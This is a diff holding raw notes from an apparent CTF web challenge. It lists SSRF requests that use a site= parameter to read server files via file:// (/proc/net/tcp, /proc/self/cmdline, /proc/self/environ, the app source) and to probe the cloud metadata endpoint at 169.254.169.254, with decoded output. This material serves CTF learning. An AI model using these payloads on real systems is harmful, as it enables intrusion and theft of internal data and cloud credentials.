@@ -1,0 +1,54 @@
+Source: https://xuanxuanblingbling.github.io/ctf/web/2019/10/13/complex/
+
+http://35.194.175.80:8000/query?site=file:///proc/net/tcp
+	# 0.0.0.0
+	00000000:0016 => 22
+	00000000:1F40 => 8000
+
+	# 127.0.0.1
+	0100007F:A5AF => 42415
+	0100007F:BCB6 => 48310
+	0100007F:BD88 => 48520
+
+	# 35.194.175.80
+	50AFC223:1F40 => 8000
+	50AFC223:A4B6 => 42166
+	50AFC223:A670 => 42608
+
+	# 10.140.0.8
+	08008C0A:1F40 => 8000
+	08008C0A:8818 => 34840
+	08008C0A:881E => 34846
+
+	# 169.254.169.254
+	FEA9FEA9:0050 => 80
+
+file:///proc/net/udp
+	# 127.0.0.53:53
+	3500007F:0035
+	# 10.140.0.8:68
+	08008C0A:0044
+	# 127.0.0.1:323
+	0100007F:0143
+
+file:///proc/net/arp
+	172.17.0.4
+	172.17.0.3
+	172.17.0.2
+	10.140.0.1
+
+
+http://35.194.175.80:8000/query?site=file:///proc/self/cmdline
+	/usr/local/bin/python /usr/local/bin/gunicorn main-dc1e2f5f7a4f359bb5ce1317a:app --bind 0.0.0.0:8000 --workers 5 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -
+
+file:///opt/workdir/main-dc1e2f5f7a4f359bb5ce1317a.py
+
+
+http://35.194.175.80:8000/query?site=http://169.254.169.254:80/computeMetadata/
+	v1/ v1beta1/
+
+http://35.194.175.80:8000/query?site=http://169.254.169.254:80/0.1
+	meta-data/
+
+file:///proc/self/environ
+	/opt/workdir
